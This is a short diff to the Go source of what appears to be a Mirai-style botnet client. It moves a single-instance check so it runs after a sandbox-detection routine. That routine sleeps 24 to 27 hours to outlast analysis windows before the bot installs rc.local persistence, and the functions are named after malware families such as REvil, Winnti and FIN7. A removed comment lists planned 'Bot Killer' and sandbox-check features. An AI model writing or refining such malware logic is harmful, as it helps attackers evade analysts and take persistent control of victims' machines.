@@ -9,7 +9,7 @@
 // ⠀⠀⠀⠀⠀⠀⠰⠆⠁⠀⢈⠉⠹⣹⠈⠁⠀⠆⢰⢆⢀⣾⣾⠉⠀⠀⠀⠀⠀⠀
 // ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠷⠀⠄⣤⡀⠀⣠⠠⣤⠄⠼⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀
 // ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-//   WIP/INCOMING FEATURES: Mirai/Bot Killer, Nanosecond Sandbox Check;
+//   
 // ============================================================================
 //
 //  For months I pulled apart dozens of Mirai variants line by line. I read every Xlabs
@@ -268,7 +268,6 @@ func main() {
 
 	deoxys("main: Bot starting up...")
 	deoxys("main: Protocol version: %s", buildTag)
-	revilSingleInstance()
 	if winnti() {
 		// Sleep 24-27h — outlasts sandbox analysis windows without
 		// producing a suspicious immediate exit.
@@ -278,6 +277,7 @@ func main() {
 		os.Exit(0)
 	}
 	deoxys("main: No sandbox detected, continuing")
+	revilSingleInstance()
 	deoxys("main: Running persistence check (fin7 -> rc.local)...")
 	fin7()
 	deoxys("main: fin7 persistence check complete")
